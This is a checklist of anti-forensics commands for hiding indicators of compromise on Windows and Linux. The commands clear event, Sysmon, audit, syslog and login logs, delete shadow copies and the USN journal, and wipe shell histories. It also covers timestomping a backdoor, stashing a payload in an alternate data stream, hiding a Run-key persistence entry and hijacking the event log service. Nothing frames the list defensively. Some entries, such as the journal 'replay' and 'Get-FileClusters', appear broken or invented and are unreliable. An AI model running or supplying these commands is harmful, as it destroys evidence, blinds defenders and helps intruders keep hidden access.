# IOC Hiding Techniques

- [ ] **Clearing Windows Event Logs**  
  ```powershell
  wevtutil cl Application
  wevtutil cl System
  wevtutil cl Security
  ```

- [ ] **Removing Sysmon Logs**  
  ```powershell
  Remove-Item -Path "C:\Windows\System32\winevt\Logs\Microsoft-Windows-Sysmon%4Operational.evtx" -Force
  ```

- [ ] **Clearing Windows Firewall Logs**  
  ```powershell
  wevtutil cl "Microsoft-Windows-Windows Firewall With Advanced Security/Firewall"
  ```

- [ ] **Wiping Security-Event Registry Channels**  
  ```powershell
  reg delete "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /f
  ```

- [ ] **Disabling and Clearing Audit Policies**  
  ```cmd
  auditpol /set /subcategory:* /success:disable /failure:disable
  auditpol /clear /y
  ```

- [ ] **Deleting Prefetch Files**  
  ```cmd
  del C:\Windows\Prefetch\* /F /Q
  ```

- [ ] **Deleting Volume Shadow Copies**  
  ```cmd
  vssadmin delete shadows /all /quiet
  ```

- [ ] **Wiping the NTFS USN Journal**  
  ```cmd
  fsutil usn deletejournal /N C: /quiet
  ```

- [ ] **Zero-filling Free Space (MFT Artifact Removal)**  
  ```cmd
  sdelete -z C:
  ```

- [ ] **Flushing Windows DNS Cache**  
  ```cmd
  ipconfig /flushdns
  ```

- [ ] **Clearing Windows ARP Cache**  
  ```cmd
  arp -d *
  ```

- [ ] **Clearing Bash History**  
  ```bash
  history -c && history -w
  rm ~/.bash_history
  ```

- [ ] **Clearing Zsh History**  
  ```bash
  : > ~/.zsh_history
  unset HISTFILE
  ```

- [ ] **Clearing PowerShell History**  
  ```powershell
  Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
  Set-PSReadlineOption -HistorySaveStyle SaveNothing
  ```

- [ ] **Truncating Linux Auth & Syslog**  
  ```bash
  truncate -s 0 /var/log/auth.log /var/log/syslog
  ```

- [ ] **Stopping auditd & Deleting Its Logs**  
  ```bash
  systemctl stop auditd
  rm -f /var/log/audit/audit.log
  systemctl start auditd
  ```

- [ ] **Vacuuming Systemd Journal Logs**  
  ```bash
  journalctl --rotate
  journalctl --vacuum-time=1s
  ```

- [ ] **Timestomping File Timestamps**  
  ```bash
  # Linux
  touch -d "2023-01-01 00:00:00" /path/to/malicious.exe

  # Windows PowerShell
  (Get-Item C:\Tools\backdoor.exe).LastWriteTime = '2023-01-01 00:00:00'
  ```

- [ ] **Clearing Shell Session Records**  
  ```bash
  rm -rf ~/.zsh_sessions/*   # Zsh session logs
  ```

- [ ] **Wiping Login Records (wtmp/btmp/lastlog)**  
  ```bash
  > /var/log/wtmp
  > /var/log/btmp
  > /var/log/lastlog
  ```

- [ ] **Transactional NTFS Delete**  
  ```powershell
  Start-Transaction
  Remove-Item -Path C:\Windows\System32\winevt\Logs\Security.evtx -Force -Transacted
  Complete-Transaction
  ```

- [ ] **Shadow Volume Mount Trick**  
  ```cmd
  mklink /J C:\Temp\AVHShadow \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\winevt\Logs
  del C:\Temp\AVHShadow\Security.evtx /Q
  ```

- [ ] **Alternate Data Stream (ADS) Stashing**  
  ```cmd
  type backdoor.exe > C:\Windows\System32\winlogon.exe:hidden_payload.exe
  ```

- [ ] **Unicode-Null Registry Key Padding**  
  ```reg
  reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Updater`0" /ve /d "C:\Tools\svc.dll" /f
  ```

- [ ] **Event Log Service Binary Hijack**  
  ```cmd
  sc config eventlog binPath= "C:\Windows\System32\rundll32.exe C:\Tools\dummy.dll,ServiceMain"
  net stop eventlog & net start eventlog
  ```

- [ ] **WMI Repository Reset (Clears WMI-Based Audits)**  
  ```cmd
  net stop winmgmt /y
  rd /S /Q "%windir%\System32\wbem\Repository"
  net start winmgmt
  ```

- [ ] **On-Idle Scheduled Task Log Cleanup**  
  ```cmd
  schtasks /Create /SC ONIDLE /I 1 /TN "SysMaintenance" /TR "wevtutil cl Security"
  ```

- [ ] **In-Memory Patch of EventWrite Calls**  
  ```powershell
  # Conceptual: Inject into EventLog service then Write-ProcessMemory to patch EventWrite to RET
  ```

- [ ] **Perfmon Counter Log Overwrite**  
  ```cmd
  logman create counter MyCover /f bin --max 1MB -o "C:\Windows\System32\winevt\Logs\Security.evtx" \Processor(_Total)\% Processor Time
  logman start MyCover
  ```

- [ ] **USN Journal Replay “Wipe”**  
  ```cmd
  fsutil usn replayjournal C: "00000001-00000000"
  ```

- [ ] **DLL Proxying in Sysmon**  
  ```powershell
  Copy-Item C:\Windows\System32\xmllite.dll C:\Tools\Sysmon\xmllite.dll
  # Build a proxy DLL that filters EventWrite calls before passing to real DLL
  ```

- [ ] **Cluster-Aligned File Carving**  
  ```powershell
  $clusters = Get-FileClusters C:\Windows\System32\winevt\Logs\Security.evtx
  foreach($c in $clusters){ fsutil file createNew C:\dummy\$c.bin 4096 }
  ```

